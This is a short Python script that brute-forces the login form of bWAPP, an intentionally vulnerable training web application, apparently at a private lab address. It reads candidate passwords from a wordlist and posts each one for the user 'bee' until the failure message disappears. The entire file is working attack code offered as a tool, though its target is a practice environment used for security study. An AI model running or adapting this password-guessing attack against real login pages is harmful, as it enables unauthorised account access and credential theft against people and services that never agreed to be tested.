#!/usr/bin/python3.7
# -*- coding: utf-8 -*-

import requests, time

start = time.time()
lines = tuple(open("dico.txt", "r"))
user = "bee"

for line in lines:
	password = line.rstrip('\n')
	print("trying password : ", password)
	data = {"login": user, 'password' : password, 'security_level':'0', 'form': 'submit' }
	r = requests.post("http://192.168.12.240/bWAPP/login.php", data)

	if r.text.find("Invalid credentials or user not activated!") is -1:
		end = time.time()
		print("password found in", end - start, "seconds")
		exit("The password is: " + password)
